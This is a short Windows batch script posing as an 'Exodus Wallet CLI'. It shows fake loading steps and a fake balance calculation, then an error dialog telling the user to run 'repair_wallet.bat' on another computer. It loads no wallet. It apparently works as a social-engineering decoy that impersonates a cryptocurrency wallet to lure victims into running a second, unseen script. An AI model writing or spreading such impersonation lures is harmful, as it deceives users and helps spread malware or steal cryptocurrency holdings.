@echo off
title Exodus Wallet CLI
color A
echo Loading Your Wallet...
ping localhost -n 2 >nul
echo [1/5] Loading 'wallet.dll'
ping localhost -n 2 >nul
echo [2/5] Loading your preferences
ping localhost -n 1 >nul
echo [3/5] Calculating Balance...
ping localhost -n 3 >nul
echo [4/5] Ready!
ping localhost -n 1 >nul
echo [5/5] Opening Wallet.
ping localhost -n 1 >nul
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Run repair_wallet.bat on another computer to successfully access your portfolio.', 'Exodus Wallet CLI', 'OK', [System.Windows.Forms.MessageBoxIcon]::Error);}"
exit